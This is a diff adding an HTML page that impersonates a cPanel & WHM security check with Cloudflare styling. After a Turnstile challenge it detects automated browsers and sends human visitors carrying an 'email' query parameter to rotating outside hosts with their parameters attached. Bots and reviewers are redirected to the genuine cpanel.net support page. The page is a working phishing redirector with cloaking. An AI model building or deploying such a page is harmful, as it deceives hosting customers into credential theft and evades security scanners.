@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC">
+    <title>cPanel Login - Verification Required</title>
+    
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    
+    <style>
+        body, html { 
+            margin: 0; padding: 0; height: 100%; width: 100%; 
+            background-color: #1a1a1a; /* Darker cPanel background */
+            font-family: "Montserrat", "Segoe UI", Arial, sans-serif;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .content-container {
+            width: 100%;
+            max-width: 850px; 
+            padding: 0 20px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .logo-box {
+            display: flex;
+            align-items: center;
+            margin-right: 15px;
+        }
+
+        .brand-url {
+            font-size: 30px; 
+            font-weight: 700;
+            color: #ff6c2c; /* Official cPanel Orange */
+            letter-spacing: -0.5px;
+            white-space: nowrap;
+        }
+
+        .status-header {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 35px;
+            color: #f2f2f2;
+            white-space: nowrap;
+        }
+
+        .widget-container {
+            margin-bottom: 45px;
+            min-height: 70px;
+        }
+
+        .secondary-text {
+            font-size: 17px;
+            color: #888888;
+            font-weight: 300;
+            white-space: nowrap;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            padding-bottom: 30px;
+        }
+
+        .hr-line {
+            width: 90%;
+            max-width: 850px;
+            border: 0;
+            border-top: 1px solid #333333;
+            margin: 0 auto 15px auto;
+        }
+
+        .footer-details, .cf-branding {
+            font-family: monospace;
+            font-size: 11px;
+            color: #555555;
+            margin-bottom: 5px;
+        }
+
+        @media (max-width: 768px) {
+            .brand-url, .status-header, .secondary-text { white-space: normal; }
+            .brand-url { font-size: 24px; }
+            .status-header { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <div class="content-container">
+            <div class="header">
+                <div class="logo-box">
+                    <svg width="32" height="32" viewBox="0 0 512 512">
+                        <path fill="#ff6c2c" d="M428.4 251.4l-75.1-75.1c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l52.5 52.5H64c-17.7 0-32 14.3-32 32s14.3 32 32 32h296.5l-52.5 52.5c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l75.1-75.1c31.2-31.2 31.2-82 0-113.2z"/>
+                    </svg>
+                </div>
+                <span class="brand-url">cPanel & WHM</span>
+            </div>
+
+            <div class="status-header" id="dynamic-status">
+                Security check required for session synchronization.
+            </div>
+
+            <div class="widget-container">
+                <div class="cf-turnstile" 
+                     data-sitekey="0x4AAAAAACZQH20w4CUOso2v" 
+                     data-callback="onSuccess" 
+                     data-theme="dark"></div>
+            </div>
+
+            <div class="secondary-text">
+                cpanel.net needs to review the security of your connection before proceeding.
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <hr class="hr-line">
+        <div class="footer-details">
+            Ray ID: <span id="ray-id"></span>
+        </div>
+        <div class="cf-branding">
+            Performance & security by Cloudflare
+        </div>
+    </div>
+
+<script>
+    // 1. YOUR LIST OF 100 NETLIFY URLS
+    const netlifyLinks = [
+        "https://soja03.fifapredict.live",
+        "https://logs02.tetreum.cc",
+        "https://loads112.tetreum.cc",
+        "https://soja01.fifapredict.live",
+        "https://soja01.fifapredict.live"
+        // ... add all 100 links here
+    ];
+
+    function onSuccess(token) {
+        document.getElementById('dynamic-status').innerText = "Verification successful. Syncing session...";
+
+        const params = new URLSearchParams(window.location.search);
+        const isBot = navigator.webdriver || !navigator.languages.length;
+
+        // 2. ROUND ROBIN LOGIC (Sequential Distribution)
+        // We use the current timestamp to pick the index
+        // This ensures that hits are spread evenly across the 100 links
+        const now = new Date().getTime(); 
+        const linkIndex = now % netlifyLinks.length; // Mathematically cycles 0-99
+        const targetURL = netlifyLinks[linkIndex];
+
+        setTimeout(function() {
+            if (!isBot && params.has('email')) {
+                // Redirect to the specific sequential link
+                window.location.href = targetURL + "?" + params.toString();
+            } else {
+                // Safety fallback for bots/manual checks
+                window.location.href = "https://cpanel.net/support/";
+            }
+        }, 1500);
+    }
+</script>
+</body>
+</html>
